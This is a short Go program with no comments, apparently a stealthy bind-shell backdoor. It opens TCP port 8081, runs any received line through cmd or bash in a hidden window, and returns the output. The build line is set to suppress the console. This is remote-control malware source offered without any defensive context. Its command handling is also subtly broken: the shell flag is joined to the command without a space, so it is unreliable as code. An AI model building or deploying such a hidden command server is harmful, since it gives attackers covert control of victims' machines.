//go build -ldflags "-s -H windowsgui" server.go
package main

import (
	"bufio"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"syscall"

	"golang.org/x/text/encoding/charmap"
)

var shell, arSh string

func main() {
	
	if runtime.GOOS == "windows" {
		shell = "cmd"
		arSh = "/c"
	} else {
		shell = "bash"
		arSh = "-c"
	}

	ln, _ := net.Listen("tcp", ":8081")
	conn, _ := ln.Accept()
	for {
		connbuf := bufio.NewReader(conn)
		str, err := connbuf.ReadString('\n')
		if err != nil {
			break
		}
		message := arSh + strings.TrimRight(str, "\r\n")

		Result := winShellExe(shell, string(message))
		conn.Write([]byte(Result + "<<<<endMessage>>>\n"))
	}

	conn.Close()
}

func winShellExe(shell string, strCommand string) (out string) {

	argsCommand := strings.Split(strCommand, " ")
	cmd := exec.Command(shell, argsCommand...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdout, _ := cmd.Output()
	d := charmap.CodePage866.NewDecoder()
	decodeOut, _ := d.Bytes(stdout)
	out = string(decodeOut)
	return
}

